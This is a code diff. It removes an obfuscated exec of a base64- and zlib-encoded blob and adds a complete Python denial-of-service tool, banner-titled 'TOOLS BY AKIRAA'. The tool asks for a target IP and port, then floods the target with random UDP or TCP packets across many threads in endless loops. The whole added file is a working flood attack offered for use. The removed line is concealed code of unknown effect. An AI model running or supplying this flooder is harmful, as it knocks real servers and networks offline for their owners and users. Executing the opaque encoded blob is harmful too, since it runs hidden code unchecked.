@@ -1,2 +1,63 @@
-import marshal,zlib,base64
-exec(zlib.decompress(base64.b64decode("eJzVVVFv2jAQfgaJ/3DJHupsCDrYy1CpxAaliA4QZNJWWlUZcUu24kSOs5Z/sMchlU6axJ/jl8yOIRgDLdOehiLFvvvu/N13OfPCyEchzX/xSB6T7xCM2dAnxUzaGwU+ZUAd4vqjZBv6g2+YJVs2pNhxPXKTSWfSAfUIQ+ZR/hiq1XYP7Hb7rAfvPkO92zg//wRHF8emlcAuDovF/tvCSDHNHyfzxx/6M/31vF2sNwD72BdJVnnW6Ejbw3z6U3lmCnzp0rNO5tPfa1H72PUkPPlsC52JxniHOg8x020hK+Kzp+wJo1W2yRN0thewQx1d2XUiW+yKS6lbpaPS3UeF6cbir7+dOLlSt/Ypa61WhVVrS7b6YiP2GbueUKGzHEFlLoXXC6AMIaPII0EkYLZDbzCDRlAyLREtZrwMIoWG6HCPxAyGvjfAWp6P1Q4a54klIcwb4VDL03H4PQILf3yL6Ah7YZUYF18DjQiySpl0ynWYw9HybspdRXKBXh8W3nBoylv5JDuEzH6n0qzZhnFpZnesxSmpu6F3i8GmERbnpBgdx++UICfvvpx8ocWucnLVaNXs7NLba79vXlXr3coHKw50XJfyWBSrE1hZUaGQ1ZLua5/CPS9b8L3BKFbKkkemwlyIict8JMrNikQyRvbUg1cmtBqnEBcA1Uq3sezySbdWg3ar3mx0DcMw4yh8P8ABKykJzL5xCXUHephGUCFf+S0OZ5xFGPFF1b8jIjARvvB/KN+zu7Wl9GFu4BOCBwxx5bOK6FLYWNZ9u6CA/1l+zuvWDzGy1prx8vlmgPLLpAXpsUJajktM27uG5ViW4WB8IBUdciWTP+ycHC/E5DyXRY8tCcuF3Mhievg2xHsGFzai/wBvxpL5")))
+import random
+import socket
+import threading
+import os
+import sys
+
+os.system("clear")
+print("""\033[92m
+            TOOLS BY AKIRAA
+░░░░░██╗███╗░░██╗███████╗
+░░░░░██║████╗░██║██╔════╝
+░░░░░██║██╔██╗██║█████╗░░
+██╗░░██║██║╚████║██╔══╝░░
+╚█████╔╝██║░╚███║███████╗
+░╚════╝░╚═╝░░╚══╝╚══════╝
+
+██████╗░░█████╗░░█████╗░██╗░░██╗███████╗████████╗
+██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝╚══██╔══╝
+██████╔╝███████║██║░░╚═╝█████═╝░█████╗░░░░░██║░░░
+██╔═══╝░██╔══██║██║░░██╗██╔═██╗░██╔══╝░░░░░██║░░░
+██║░░░░░██║░░██║╚█████╔╝██║░╚██╗███████╗░░░██║░░░
+╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░""")
+
+ip = str(input(" IP TARGET:"))
+port = int(input(" PORT:"))
+choice = str(input(" GAS DDOS?(y/n):"))
+times = int(input(" PACKET:"))
+threads = int(input(" ISI PACKET:"))
+def run():
+    data = random._urandom(911)
+    i = random.choice(("[TOK!!! TOK!!!]","[TOK!!! TOK!!!]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+            print(i +" PERMISI PAKET!!!")
+        except:
+            print("[#] SERVER IS DOWN!!!")
+
+def run2():
+    data = random._urandom(911)
+    i = random.choice(("[TOK!!! TOK!!!]","[TOK!!! TOK!!!]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +" PERMISI PAKET!!!")
+        except:
+            s.close()
+            print("[#] SERVER IS DOWN!!!")
+        
+for y in range(threads):
+    if choice == 'y':
+        th = threading.Thread(target = run)
+        th.start()
+    else:
+        th = threading.Thread(target = run2)
+        th.start() 
